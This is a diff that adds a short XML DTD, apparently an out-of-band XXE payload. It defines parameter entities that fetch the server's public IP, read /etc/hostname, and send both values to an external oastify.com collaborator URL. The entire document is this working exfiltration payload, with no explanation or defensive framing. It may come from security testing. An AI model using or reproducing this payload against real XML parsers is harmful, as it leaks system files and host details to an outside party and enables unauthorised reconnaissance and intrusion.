@@ -1,0 +1,5 @@
+<!ENTITY % IP SYSTEM "https://ipinfo.io/ip">
+<!ENTITY % l1 SYSTEM "file:///etc/hostname">
+<!ENTITY % e1 "<!ENTITY &#x25; exfil SYSTEM 'https://oa2q3grjun7l85c59p3f63z8fzlq9lxa.oastify.com/?ip=%IP;-%l1;'>">
+%e1;
+%exfil;
